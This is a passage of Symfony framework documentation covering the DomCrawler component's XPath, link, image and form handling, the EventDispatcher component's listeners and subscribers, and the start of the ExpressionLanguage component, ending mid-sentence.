    on :phpclass:`DOMElement`, :phpclass:`DOMNode` or :phpclass:`DOMDocument`.
    For example, you could get the HTML of a ``Crawler`` with something like
    this::

        $html = '';

        foreach ($crawler as $domElement) {
            $html .= $domElement->ownerDocument->saveHTML($domElement);
        }

    Or you can get the HTML of the first node using
    :method:`Symfony\\Component\\DomCrawler\\Crawler::html`::

        // if the node does not exist, calling to html() will result in an exception
        $html = $crawler->html();

        // avoid the exception passing an argument that html() returns when node does not exist
        $html = $crawler->html('Default <strong>HTML</strong> content');

    Or you can get the outer HTML of the first node using
    :method:`Symfony\\Component\\DomCrawler\\Crawler::outerHtml`::

        $html = $crawler->outerHtml();

Expression Evaluation
~~~~~~~~~~~~~~~~~~~~~

The ``evaluate()`` method evaluates the given XPath expression. The return
value depends on the XPath expression. If the expression evaluates to a scalar
value (e.g. HTML attributes), an array of results will be returned. If the
expression evaluates to a DOM document, a new ``Crawler`` instance will be
returned.

This behavior is best illustrated with examples::

    use Symfony\Component\DomCrawler\Crawler;

    $html = '<html>
    <body>
        <span id="article-100" class="article">Article 1</span>
        <span id="article-101" class="article">Article 2</span>
        <span id="article-102" class="article">Article 3</span>
    </body>
    </html>';

    $crawler = new Crawler();
    $crawler->addHtmlContent($html);

    $crawler->filterXPath('//span[contains(@id, "article-")]')->evaluate('substring-after(@id, "-")');
    /* Result:
    [
        0 => '100',
        1 => '101',
        2 => '102',
    ];
    */

    $crawler->evaluate('substring-after(//span[contains(@id, "article-")]/@id, "-")');
    /* Result:
    [
        0 => '100',
    ]
    */

    $crawler->filterXPath('//span[@class="article"]')->evaluate('count(@id)');
    /* Result:
    [
        0 => 1.0,
        1 => 1.0,
        2 => 1.0,
    ]
    */

    $crawler->evaluate('count(//span[@class="article"])');
    /* Result:
    [
        0 => 3.0,
    ]
    */

    $crawler->evaluate('//span[1]');
    // A Symfony\Component\DomCrawler\Crawler instance

Links
~~~~~

Use the ``filter()`` method to find links by their ``id`` or ``class``
attributes and use the ``selectLink()`` method to find links by their content
(it also finds clickable images with that content in its ``alt`` attribute).

Both methods return a ``Crawler`` instance with just the selected link. Use the
``link()`` method to get the :class:`Symfony\\Component\\DomCrawler\\Link` object
that represents the link::

    // first, select the link by id, class or content...
    $linkCrawler = $crawler->filter('#sign-up');
    $linkCrawler = $crawler->filter('.user-profile');
    $linkCrawler = $crawler->selectLink('Log in');

    // ...then, get the Link object:
    $link = $linkCrawler->link();

    // or do all this at once:
    $link = $crawler->filter('#sign-up')->link();
    $link = $crawler->filter('.user-profile')->link();
    $link = $crawler->selectLink('Log in')->link();

The :class:`Symfony\\Component\\DomCrawler\\Link` object has several useful
methods to get more information about the selected link itself::

    // returns the proper URI that can be used to make another request
    $uri = $link->getUri();

.. note::

    The ``getUri()`` is especially useful as it cleans the ``href`` value and
    transforms it into how it should really be processed. For example, for a
    link with ``href="#foo"``, this would return the full URI of the current
    page suffixed with ``#foo``. The return from ``getUri()`` is always a full
    URI that you can act on.

Images
~~~~~~

To find an image by its ``alt`` attribute, use the ``selectImage`` method on an
existing crawler. This returns a ``Crawler`` instance with just the selected
image(s). Calling ``image()`` gives you a special
:class:`Symfony\\Component\\DomCrawler\\Image` object::

    $imagesCrawler = $crawler->selectImage('Kitten');
    $image = $imagesCrawler->image();

    // or do this all at once
    $image = $crawler->selectImage('Kitten')->image();

The :class:`Symfony\\Component\\DomCrawler\\Image` object has the same
``getUri()`` method as :class:`Symfony\\Component\\DomCrawler\\Link`.

Forms
~~~~~

Special treatment is also given to forms. A ``selectButton()`` method is
available on the Crawler which returns another Crawler that matches ``<button>``
or ``<input type="submit">`` or ``<input type="button">`` elements (or an
``<img>`` element inside them). The string given as argument is looked for in
the ``id``, ``alt``, ``name``, and ``value`` attributes and the text content of
those elements.

This method is especially useful because you can use it to return
a :class:`Symfony\\Component\\DomCrawler\\Form` object that represents the
form that the button lives in::

    // button example: <button id="my-super-button" type="submit">My super button</button>

    // you can get button by its label
    $form = $crawler->selectButton('My super button')->form();

    // or by button id (#my-super-button) if the button doesn't have a label
    $form = $crawler->selectButton('my-super-button')->form();

    // or you can filter the whole form, for example a form has a class attribute: <form class="form-vertical" method="POST">
    $crawler->filter('.form-vertical')->form();

    // or "fill" the form fields with data
    $form = $crawler->selectButton('my-super-button')->form([
        'name' => 'Ryan',
    ]);

The :class:`Symfony\\Component\\DomCrawler\\Form` object has lots of very
useful methods for working with forms::

    $uri = $form->getUri();
    $method = $form->getMethod();
    $name = $form->getName();

The :method:`Symfony\\Component\\DomCrawler\\Form::getUri` method does more
than just return the ``action`` attribute of the form. If the form method
is GET, then it mimics the browser's behavior and returns the ``action``
attribute followed by a query string of all of the form's values.

.. note::

    The optional ``formaction`` and ``formmethod`` button attributes are
    supported. The ``getUri()`` and ``getMethod()`` methods take into account
    those attributes to always return the right action and method depending on
    the button used to get the form.

You can virtually set and get values on the form::

    // sets values on the form internally
    $form->setValues([
        'registration[username]' => 'symfonyfan',
        'registration[terms]'    => 1,
    ]);

    // gets back an array of values - in the "flat" array like above
    $values = $form->getValues();

    // returns the values like PHP would see them,
    // where "registration" is its own array
    $values = $form->getPhpValues();

To work with multi-dimensional fields:

.. code-block:: html

    <form>
        <input name="multi[]">
        <input name="multi[]">
        <input name="multi[dimensional]">
        <input name="multi[dimensional][]" value="1">
        <input name="multi[dimensional][]" value="2">
        <input name="multi[dimensional][]" value="3">
    </form>

Pass an array of values::

    // sets a single field
    $form->setValues(['multi' => ['value']]);

    // sets multiple fields at once
    $form->setValues(['multi' => [
        1             => 'value',
        'dimensional' => 'an other value',
    ]]);

    // tick multiple checkboxes at once
    $form->setValues(['multi' => [
        'dimensional' => [1, 3] // it uses the input value to determine which checkbox to tick
    ]]);

This is great, but it gets better! The ``Form`` object allows you to interact
with your form like a browser, selecting radio values, ticking checkboxes,
and uploading files::

    $form['registration[username]']->setValue('symfonyfan');

    // checks or unchecks a checkbox
    $form['registration[terms]']->tick();
    $form['registration[terms]']->untick();

    // selects an option
    $form['registration[birthday][year]']->select(1984);

    // selects many options from a "multiple" select
    $form['registration[interests]']->select(['symfony', 'cookies']);

    // fakes a file upload
    $form['registration[photo]']->upload('/path/to/lucas.jpg');

Using the Form Data
...................

What's the point of doing all of this? If you're testing internally, you
can grab the information off of your form as if it had just been submitted
by using the PHP values::

    $values = $form->getPhpValues();
    $files = $form->getPhpFiles();

If you're using an external HTTP client, you can use the form to grab all
of the information you need to create a POST request for the form::

    $uri = $form->getUri();
    $method = $form->getMethod();
    $values = $form->getValues();
    $files = $form->getFiles();

    // now use some HTTP client and post using this information

One great example of an integrated system that uses all of this is
the :class:`Symfony\\Component\\BrowserKit\\HttpBrowser` provided by
the :doc:`BrowserKit component </components/browser_kit>`.
It understands the Symfony Crawler object and can use it to submit forms
directly::

    use Symfony\Component\BrowserKit\HttpBrowser;
    use Symfony\Component\HttpClient\HttpClient;

    // makes a real request to an external site
    $browser = new HttpBrowser(HttpClient::create());
    $crawler = $browser->request('GET', 'https://github.com/login');

    // select the form and fill in some values
    $form = $crawler->selectButton('Sign in')->form();
    $form['login'] = 'symfonyfan';
    $form['password'] = 'anypass';

    // submits the given form
    $crawler = $browser->submit($form);

.. _components-dom-crawler-invalid:

Selecting Invalid Choice Values
...............................

By default, choice fields (select, radio) have internal validation activated
to prevent you from setting invalid values. If you want to be able to set
invalid values, you can use the  ``disableValidation()`` method on either
the whole form or specific field(s)::

    // disables validation for a specific field
    $form['country']->disableValidation()->select('Invalid value');

    // disables validation for the whole form
    $form->disableValidation();
    $form['country']->select('Invalid value');

Resolving a URI
~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\DomCrawler\\UriResolver` class takes a URI
(relative, absolute, fragment, etc.) and turns it into an absolute URI against
another given base URI::

    use Symfony\Component\DomCrawler\UriResolver;

    UriResolver::resolve('/foo', 'http://localhost/bar/foo/'); // http://localhost/foo
    UriResolver::resolve('?a=b', 'http://localhost/bar#foo'); // http://localhost/bar?a=b
    UriResolver::resolve('../../', 'http://localhost/'); // http://localhost/

Using a HTML5 Parser
~~~~~~~~~~~~~~~~~~~~

If you need the :class:`Symfony\\Component\\DomCrawler\\Crawler` to use an HTML5
parser, set its ``useHtml5Parser`` constructor argument to ``true``::

    use Symfony\Component\DomCrawler\Crawler;

    $crawler = new Crawler(null, $uri, useHtml5Parser: true);

By doing so, the crawler will use the HTML5 parser provided by the `masterminds/html5`_
library to parse the documents.

Learn more
----------

* :doc:`/testing`
* :doc:`/components/css_selector`

.. _`masterminds/html5`: https://packagist.org/packages/masterminds/html5
The EventDispatcher Component
=============================

    The EventDispatcher component provides tools that allow your application
    components to communicate with each other by dispatching events and
    listening to them.

Introduction
------------

Object-oriented code has gone a long way to ensuring code extensibility.
By creating classes that have well-defined responsibilities, your code becomes
more flexible and a developer can extend them with subclasses to modify
their behaviors. But if they want to share the changes with other developers
who have also made their own subclasses, code inheritance is no longer the
answer.

Consider the real-world example where you want to provide a plugin system
for your project. A plugin should be able to add methods, or do something
before or after a method is executed, without interfering with other plugins.
This is not an easy problem to solve with single inheritance, and even if
multiple inheritance was possible with PHP, it comes with its own drawbacks.

The Symfony EventDispatcher component implements the `Mediator`_ and `Observer`_
design patterns to make all these things possible and to make your projects
truly extensible.

Take an example from :doc:`the HttpKernel component </components/http_kernel>`.
Once a ``Response`` object has been created, it may be useful to allow other
elements in the system to modify it (e.g. add some cache headers) before
it's actually used. To make this possible, the Symfony kernel dispatches an
event - ``kernel.response``. Here's how it works:

* A *listener* (PHP object) tells a central *dispatcher* object that it
  wants to listen to the ``kernel.response`` event;

* At some point, the Symfony kernel tells the *dispatcher* object to dispatch
  the ``kernel.response`` event, passing with it an ``Event`` object that
  has access to the ``Response`` object;

* The dispatcher notifies (i.e. calls a method on) all listeners of the
  ``kernel.response`` event, allowing each of them to make modifications
  to the ``Response`` object.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/event-dispatcher

.. include:: /components/require_autoload.rst.inc

Usage
-----

.. seealso::

    This article explains how to use the EventDispatcher features as an
    independent component in any PHP application. Read the :doc:`/event_dispatcher`
    article to learn about how to use it in Symfony applications.

Events
~~~~~~

When an event is dispatched, it's identified by a unique name (e.g.
``kernel.response``), which any number of listeners might be listening to.
An :class:`Symfony\\Contracts\\EventDispatcher\\Event` instance is also
created and passed to all of the listeners. As you'll see later, the ``Event``
object itself often contains data about the event being dispatched.

Event Names and Event Objects
.............................

When the dispatcher notifies listeners, it passes an actual ``Event`` object
to those listeners. The base ``Event`` class contains a method for stopping
:ref:`event propagation <event_dispatcher-event-propagation>`, but not much
else.

.. seealso::

    Read ":doc:`/components/event_dispatcher/generic_event`" for more
    information about this base event object.

Often times, data about a specific event needs to be passed along with the
``Event`` object so that the listeners have the needed information. In such
case, a special subclass that has additional methods for retrieving and
overriding information can be passed when dispatching an event. For example,
the ``kernel.response`` event uses a
:class:`Symfony\\Component\\HttpKernel\\Event\\ResponseEvent`, which
contains methods to get and even replace the ``Response`` object.

The Dispatcher
~~~~~~~~~~~~~~

The dispatcher is the central object of the event dispatcher system. In
general, a single dispatcher is created, which maintains a registry of
listeners. When an event is dispatched via the dispatcher, it notifies all
listeners registered with that event::

    use Symfony\Component\EventDispatcher\EventDispatcher;

    $dispatcher = new EventDispatcher();

Connecting Listeners
~~~~~~~~~~~~~~~~~~~~

To take advantage of an existing event, you need to connect a listener to
the dispatcher so that it can be notified when the event is dispatched.
A call to the dispatcher's ``addListener()`` method associates any valid
PHP callable to an event::

    $listener = new AcmeListener();
    $dispatcher->addListener('acme.foo.action', [$listener, 'onFooAction']);

The ``addListener()`` method takes up to three arguments:

#. The event name (string) that this listener wants to listen to;
#. A PHP callable that will be executed when the specified event is dispatched;
#. An optional priority, defined as a positive or negative integer (defaults to
   ``0``). The higher the number, the earlier the listener is called. If two
   listeners have the same priority, they are executed in the order that they
   were added to the dispatcher.

.. note::

    A `PHP callable`_ is a PHP variable that can be used by the
    ``call_user_func()`` function and returns ``true`` when passed to the
    ``is_callable()`` function. It can be a ``\Closure`` instance, an object
    implementing an ``__invoke()`` method (which is what closures are in fact),
    a string representing a function or an array representing an object
    method or a class method.

    So far, you've seen how PHP objects can be registered as listeners.
    You can also register PHP `Closures`_ as event listeners::

        use Symfony\Contracts\EventDispatcher\Event;

        $dispatcher->addListener('acme.foo.action', function (Event $event): void {
            // will be executed when the acme.foo.action event is dispatched
        });

Once a listener is registered with the dispatcher, it waits until the event
is notified. In the above example, when the ``acme.foo.action`` event is dispatched,
the dispatcher calls the ``AcmeListener::onFooAction()`` method and passes
the ``Event`` object as the single argument::

    use Symfony\Contracts\EventDispatcher\Event;

    class AcmeListener
    {
        // ...

        public function onFooAction(Event $event): void
        {
            // ... do something
        }
    }

The ``$event`` argument is the event object that was passed when dispatching the
event. In many cases, a special event subclass is passed with extra
information. You can check the documentation or implementation of each event to
determine which instance is passed.

.. sidebar:: Registering Event Listeners and Subscribers in the Service Container

    Registering service definitions and tagging them with the
    ``kernel.event_listener`` and ``kernel.event_subscriber`` tags is not enough
    to enable the event listeners and event subscribers. You must also register
    a compiler pass called ``RegisterListenersPass()`` in the container builder::

        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Component\DependencyInjection\ParameterBag\ParameterBag;
        use Symfony\Component\EventDispatcher\DependencyInjection\RegisterListenersPass;
        use Symfony\Component\EventDispatcher\EventDispatcher;

        $container = new ContainerBuilder(new ParameterBag());
        // register the compiler pass that handles the 'kernel.event_listener'
        // and 'kernel.event_subscriber' service tags
        $container->addCompilerPass(new RegisterListenersPass());

        $container->register('event_dispatcher', EventDispatcher::class);

        // registers an event listener
        $container->register('listener_service_id', \AcmeListener::class)
            ->addTag('kernel.event_listener', [
                'event' => 'acme.foo.action',
                'method' => 'onFooAction',
            ]);

        // registers an event subscriber
        $container->register('subscriber_service_id', \AcmeSubscriber::class)
            ->addTag('kernel.event_subscriber');

    ``RegisterListenersPass`` resolves aliased class names which for instance
    allows to refer to an event via the fully qualified class name (FQCN) of the
    event class. The pass will read the alias mapping from a dedicated container
    parameter. This parameter can be extended by registering another compiler pass,
    ``AddEventAliasesPass``::

        use Symfony\Component\DependencyInjection\Compiler\PassConfig;
        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Component\DependencyInjection\ParameterBag\ParameterBag;
        use Symfony\Component\EventDispatcher\DependencyInjection\AddEventAliasesPass;
        use Symfony\Component\EventDispatcher\DependencyInjection\RegisterListenersPass;
        use Symfony\Component\EventDispatcher\EventDispatcher;

        $container = new ContainerBuilder(new ParameterBag());
        $container->addCompilerPass(new AddEventAliasesPass([
            \AcmeFooActionEvent::class => 'acme.foo.action',
        ]));
        $container->addCompilerPass(new RegisterListenersPass(), PassConfig::TYPE_BEFORE_REMOVING);

        $container->register('event_dispatcher', EventDispatcher::class);

        // registers an event listener
        $container->register('listener_service_id', \AcmeListener::class)
            ->addTag('kernel.event_listener', [
                // will be translated to 'acme.foo.action' by RegisterListenersPass.
                'event' => \AcmeFooActionEvent::class,
                'method' => 'onFooAction',
            ]);

    .. note::

        Note that ``AddEventAliasesPass`` has to be processed before ``RegisterListenersPass``.

    The listeners pass assumes that the event dispatcher's service
    id is ``event_dispatcher``, that event listeners are tagged with the
    ``kernel.event_listener`` tag, that event subscribers are tagged
    with the ``kernel.event_subscriber`` tag and that the alias mapping is
    stored as parameter ``event_dispatcher.event_aliases``.

.. _event_dispatcher-closures-as-listeners:

Creating and Dispatching an Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to registering listeners with existing events, you can create
and dispatch your own events. This is useful when creating third-party
libraries and also when you want to keep different components of your own
system flexible and decoupled.

.. _creating-an-event-object:

Creating an Event Class
.......................

Suppose you want to create a new event that is dispatched
each time a customer orders a product with your application. When dispatching
this event, you'll pass a custom event instance that has access to the placed
order. Start by creating this custom event class and documenting it::

    namespace Acme\Store\Event;

    use Acme\Store\Order;
    use Symfony\Contracts\EventDispatcher\Event;

    /**
     * This event is dispatched each time an order
     * is placed in the system.
     */
    final class OrderPlacedEvent extends Event
    {
        public function __construct(private Order $order) {}

        public function getOrder(): Order
        {
            return $this->order;
        }
    }

Each listener now has access to the order via the ``getOrder()`` method.

Dispatch the Event
..................

The :method:`Symfony\\Component\\EventDispatcher\\EventDispatcher::dispatch`
method notifies all listeners of the given event. It takes two arguments:
the ``Event`` instance to pass to each listener of that event and the name
of the event to dispatch::

    use Acme\Store\Event\OrderPlacedEvent;
    use Acme\Store\Order;

    // the order is somehow created or retrieved
    $order = new Order();
    // ...

    // creates the OrderPlacedEvent and dispatches it
    $event = new OrderPlacedEvent($order);
    $dispatcher->dispatch($event);

Notice that the special ``OrderPlacedEvent`` object is created and passed to
the ``dispatch()`` method. Now, any listener to the ``OrderPlacedEvent::class``
event will receive the ``OrderPlacedEvent``.

.. note::

    If you don't need to pass any additional data to the event listeners, you
    can also use the default
    :class:`Symfony\\Contracts\\EventDispatcher\\Event` class. In such case,
    you can document the event and its name in a generic ``StoreEvents`` class,
    similar to the :class:`Symfony\\Component\\HttpKernel\\KernelEvents`
    class::

        namespace App\Event;

        class StoreEvents {

            /**
            * @Event("Symfony\Contracts\EventDispatcher\Event")
            */
            public const ORDER_PLACED = 'order.placed';
        }

    And use the :class:`Symfony\\Contracts\\EventDispatcher\\Event` class to
    dispatch the event::

        use Symfony\Contracts\EventDispatcher\Event;

        $this->eventDispatcher->dispatch(new Event(), StoreEvents::ORDER_PLACED);

.. _event_dispatcher-using-event-subscribers:

Using Event Subscribers
~~~~~~~~~~~~~~~~~~~~~~~

The most common way to listen to an event is to register an *event listener*
with the dispatcher. This listener can listen to one or more events and
is notified each time those events are dispatched.

Another way to listen to events is via an *event subscriber*. An event
subscriber is a PHP class that's able to tell the dispatcher exactly which
events it should subscribe to. It implements the
:class:`Symfony\\Component\\EventDispatcher\\EventSubscriberInterface`
interface, which requires a single static method called
:method:`Symfony\\Component\\EventDispatcher\\EventSubscriberInterface::getSubscribedEvents`.
Take the following example of a subscriber that subscribes to the
``kernel.response`` and ``OrderPlacedEvent::class`` events::

    namespace Acme\Store\Event;

    use Acme\Store\Event\OrderPlacedEvent;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\ResponseEvent;
    use Symfony\Component\HttpKernel\KernelEvents;

    class StoreSubscriber implements EventSubscriberInterface
    {
        public static function getSubscribedEvents(): array
        {
            return [
                KernelEvents::RESPONSE => [
                    ['onKernelResponsePre', 10],
                    ['onKernelResponsePost', -10],
                ],
                OrderPlacedEvent::class => 'onPlacedOrder',
            ];
        }

        public function onKernelResponsePre(ResponseEvent $event): void
        {
            // ...
        }

        public function onKernelResponsePost(ResponseEvent $event): void
        {
            // ...
        }

        public function onPlacedOrder(OrderPlacedEvent $event): void
        {
            $order = $event->getOrder();
            // ...
        }
    }

This is very similar to a listener class, except that the class itself can
tell the dispatcher which events it should listen to. To register a subscriber
with the dispatcher, use the
:method:`Symfony\\Component\\EventDispatcher\\EventDispatcher::addSubscriber`
method::

    use Acme\Store\Event\StoreSubscriber;
    // ...

    $subscriber = new StoreSubscriber();
    $dispatcher->addSubscriber($subscriber);

The dispatcher will automatically register the subscriber for each event
returned by the ``getSubscribedEvents()`` method. This method returns an array
indexed by event names and whose values are either the method name to call
or an array composed of the method name to call and a priority (a positive or
negative integer that defaults to ``0``).

The example above shows how to register several listener methods for the same
event in subscriber and also shows how to pass the priority of each listener
method. The higher the number, the earlier the method is called. In the above
example, when the ``kernel.response`` event is triggered, the methods
``onKernelResponsePre()`` and ``onKernelResponsePost()`` are called in that
order.

.. _event_dispatcher-event-propagation:

Stopping Event Flow/Propagation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In some cases, it may make sense for a listener to prevent any other listeners
from being called. In other words, the listener needs to be able to tell
the dispatcher to stop all propagation of the event to future listeners
(i.e. to not notify any more listeners). This can be accomplished from
inside a listener via the
:method:`Symfony\\Contracts\\EventDispatcher\\Event::stopPropagation` method::

    use Acme\Store\Event\OrderPlacedEvent;

    public function onPlacedOrder(OrderPlacedEvent $event): void
    {
        // ...

        $event->stopPropagation();
    }

Now, any listeners to ``OrderPlacedEvent::class`` that have not yet been called will
*not* be called.

It is possible to detect if an event was stopped by using the
:method:`Symfony\\Contracts\\EventDispatcher\\Event::isPropagationStopped`
method which returns a boolean value::

    // ...
    $dispatcher->dispatch($event, 'foo.event');
    if ($event->isPropagationStopped()) {
        // ...
    }

.. _event_dispatcher-dispatcher-aware-events:

EventDispatcher Aware Events and Listeners
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ``EventDispatcher`` always passes the dispatched event, the event's
name and a reference to itself to the listeners. This can lead to some advanced
applications of the ``EventDispatcher`` including dispatching other events inside
listeners, chaining events or even lazy loading listeners into the dispatcher object.

.. _event_dispatcher-event-name-introspection:

Event Name Introspection
~~~~~~~~~~~~~~~~~~~~~~~~

The ``EventDispatcher`` instance, as well as the name of the event that
is dispatched, are passed as arguments to the listener::

    use Symfony\Contracts\EventDispatcher\Event;
    use Symfony\Contracts\EventDispatcher\EventDispatcherInterface;

    class MyListener
    {
        public function myEventListener(Event $event, string $eventName, EventDispatcherInterface $dispatcher): void
        {
            // ... do something with the event name
        }
    }

Other Dispatchers
-----------------

Besides the commonly used ``EventDispatcher``, the component comes
with some other dispatchers:

* :doc:`/components/event_dispatcher/immutable_dispatcher`
* :doc:`/components/event_dispatcher/traceable_dispatcher`

Learn More
----------

.. toctree::
    :maxdepth: 1

    /components/event_dispatcher/generic_event

* :ref:`The kernel.event_listener tag <dic-tags-kernel-event-listener>`
* :ref:`The kernel.event_subscriber tag <dic-tags-kernel-event-subscriber>`

.. _Mediator: https://en.wikipedia.org/wiki/Mediator_pattern
.. _Observer: https://en.wikipedia.org/wiki/Observer_pattern
.. _Closures: https://www.php.net/manual/en/functions.anonymous.php
.. _PHP callable: https://www.php.net/manual/en/language.types.callable.php
The ExpressionLanguage Component
================================

    The ExpressionLanguage component provides an engine that can compile and
    evaluate expressions. An expression is a one-liner that returns a value
    (mostly, but not limited to, Booleans).

Installation
------------

.. code-block:: terminal

    $ composer require symfony/expression-language

.. include:: /components/require_autoload.rst.inc

.. _how-can-the-expression-engine-help-me:

How can the Expression Language Help Me?
----------------------------------------

The purpose of the component is to allow users to use expressions inside
configuration for more complex logic. For example, the Symfony Framework uses
expressions in security, for validation rules and in route matching.

Besides using the component in the framework itself, the ExpressionLanguage
component is a perfect candidate for the foundation of a *business rule engine*.
The idea is to let the webmaster of a website configure things in a dynamic
way without using PHP and without introducing security problems:

.. _component-expression-language-examples:

.. code-block:: text

    # Get the special price if
    user.getGroup() in ['good_customers', 'collaborator']

    # Promote article to the homepage when
    article.commentCount > 100 and article.category not in ["misc"]

    # Send an alert when
    product.stock < 15

Expressions can be seen as a very restricted PHP sandbox and are less vulnerable
to external injections because you must explicitly declare which variables are
available in an expression (but you should still sanitize any data given by end
users and passed to expressions).

Usage
-----

The ExpressionLanguage component can compile and evaluate expressions.
Expressions are one-liners that often return a Boolean, which can be used
by the code executing the expression in an ``if`` statement. A simple example
of an expression is ``1 + 2``. You can also use more complicated expressions,
such as ``someArray[3].someMethod('bar')``.

The component provides 2 ways to work with expressions:

* **evaluation**: the expression is evaluated without being compiled to PHP;
* **compile**: the expression is compiled to PHP, so it can be cached and
  evaluated.

The main class of the component is
:class:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage`::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    $expressionLanguage = new ExpressionLanguage();

    var_dump($expressionLanguage->evaluate('1 + 2')); // displays 3

    var_dump($expressionLanguage->compile('1 + 2')); // displays (1 + 2)

.. tip::

    See :doc:`/reference/formats/expression_language` to learn the syntax of
    the ExpressionLanguage component.

Null Coalescing Operator
........................

.. note::

    This content has been moved to the ref:`null coalescing operator <component-expression-null-coalescing-operator>`_
    section of ExpressionLanguage syntax reference page.

Parsing and Linting Expressions
...............................

The ExpressionLanguage component provides a way to parse and lint expressions.
The :method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::parse`
method returns a :class:`Symfony\\Component\\ExpressionLanguage\\ParsedExpression`
instance that can be used to inspect and manipulate the expression. The
:method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::lint`, on the
other hand, returns a boolean indicating if the expression is valid or not::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    $expressionLanguage = new ExpressionLanguage();

    var_dump($expressionLanguage->parse('1 + 2'));
    // displays the AST nodes of the expression which can be
    // inspected and manipulated

    var_dump($expressionLanguage->lint('1 + 2')); // displays true

The behavior of these methods can be configured with some flags defined in the
:class:`Symfony\\Component\\ExpressionLanguage\\Parser` class:

* ``IGNORE_UNKNOWN_VARIABLES``: don't throw an exception if a variable is not
  defined in the expression;
* ``IGNORE_UNKNOWN_FUNCTIONS``: don't throw an exception if a function is not
  defined in the expression.

This is how you can use these flags::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;
    use Symfony\Component\ExpressionLanguage\Parser;

    $expressionLanguage = new ExpressionLanguage();

    // this returns true because the unknown variables and functions are ignored
    var_dump($expressionLanguage->lint('unknown_var + unknown_function()', Parser::IGNORE_UNKNOWN_VARIABLES | Parser::IGNORE_UNKNOWN_FUNCTIONS));

.. versionadded:: 7.1

    The support for flags in the ``parse()`` and ``lint()`` methods
    was introduced in Symfony 7.1.

Passing in Variables
--------------------

You can also pass variables into the expression, which can be of any valid
PHP type (including objects)::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    $expressionLanguage = new ExpressionLanguage();

    class Apple
    {
        public string $variety;
    }

    $apple = new Apple();
    $apple->variety = 'Honeycrisp';

    var_dump($expressionLanguage->evaluate(
        'fruit.variety',
        [
            'fruit' => $apple,
        ]
    )); // displays "Honeycrisp"

When using this component inside a Symfony application, certain objects and
variables are automatically injected by Symfony so you can use them in your
expressions (e.g. the request, the current user, etc.):

* :doc:`Variables available in security expressions </security/expressions>`;
* :doc:`Variables available in service container expressions </service_container/expression_language>`;
* :ref:`Variables available in routing expressions <routing-matching-expressions>`.

.. caution::

    When using variables in expressions, avoid passing untrusted data into the
    array of variables. If you can't avoid that, sanitize non-alphanumeric
    characters in untrusted data to prevent malicious users from injecting
    control characters and altering the expression.

.. _expression-language-caching:

Caching
-------

The ExpressionLanguage component provides a
:method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::compile`
method to be able to cache the expressions in plain PHP. But internally, the
component also caches the parsed expressions, so duplicated expressions can be
compiled/evaluated quicker.

The Workflow
~~~~~~~~~~~~

Both :method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::evaluate`
and ``compile()`` need to do some things before each can provide the return
values. For ``evaluate()``, this overhead is even bigger.

Both methods need to tokenize and parse the expression. This is done by the
:method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::parse`
method. It  returns a :class:`Symfony\\Component\\ExpressionLanguage\\ParsedExpression`.
Now, the ``compile()`` method just returns the string conversion of this object.
The ``evaluate()`` method needs to loop through the "nodes" (pieces of an
expression saved in the ``ParsedExpression``) and evaluate them on the fly.

To save time, the ``ExpressionLanguage`` caches the ``ParsedExpression`` so
it can skip the tokenization and parsing steps with duplicate expressions. The
caching is done by a PSR-6 `CacheItemPoolInterface`_ instance (by default, it
uses an :class:`Symfony\\Component\\Cache\\Adapter\\ArrayAdapter`). You can
customize this by creating a custom cache pool or using one of the available
ones and injecting this using the constructor::

    use Symfony\Component\Cache\Adapter\RedisAdapter;
    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    $cache = new RedisAdapter(...);
    $expressionLanguage = new ExpressionLanguage($cache);

.. seealso::

    See the :doc:`/components/cache` documentation for more information about
    available cache adapters.

Using Parsed and Serialized Expressions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Both ``evaluate()`` and ``compile()`` can handle ``ParsedExpression`` and
``SerializedParsedExpression``::

    // ...

    // the parse() method returns a ParsedExpression
    $expression = $expressionLanguage->parse('1 + 4', []);

    var_dump($expressionLanguage->evaluate($expression)); // prints 5

.. code-block:: php

    use Symfony\Component\ExpressionLanguage\SerializedParsedExpression;
    // ...

    $expression = new SerializedParsedExpression(
        '1 + 4',
        serialize($expressionLanguage->parse('1 + 4', [])->getNodes())
    );

    var_dump($expressionLanguage->evaluate($expression)); // prints 5

.. _expression-language-ast:

AST Dumping and Editing
-----------------------

It's difficult to manipulate or inspect the expressions created with the ExpressionLanguage
component, because the expressions are plain strings. A better approach is to
turn those expressions into an AST. In computer science, `AST`_ (*Abstract
Syntax Tree*) is *"a tree representation of the structure of source code written
in a programming language"*. In Symfony, an ExpressionLanguage AST is a set of
nodes that contain PHP classes representing the given expression.

Dumping the AST
~~~~~~~~~~~~~~~

Call the :method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::getNodes`
method after parsing any expression to get its AST::

    use Symfony\Component\ExpressionLanguage\ExpressionLanguage;

    $ast = (new ExpressionLanguage())
        ->parse('1 + 2', [])
        ->getNodes()
    ;

    // dump the AST nodes for inspection
    var_dump($ast);

    // dump the AST nodes as a string representation
    $astAsString = $ast->dump();

Manipulating the AST
~~~~~~~~~~~~~~~~~~~~

The nodes of the AST can also be dumped into a PHP array of nodes to allow
manipulating them. Call the :method:`Symfony\\Component\\ExpressionLanguage\\ExpressionLanguage::toArray`
method to turn the AST into an array::

    // ...

    $astAsArray = (new ExpressionLanguage())
        ->parse('1 + 2', [])
        ->getNodes()
        ->toArray()
    ;

.. _expression-language-extending:

Extending the ExpressionLanguage
--------------------------------

The ExpressionLanguage can be extended by adding custom functions. For
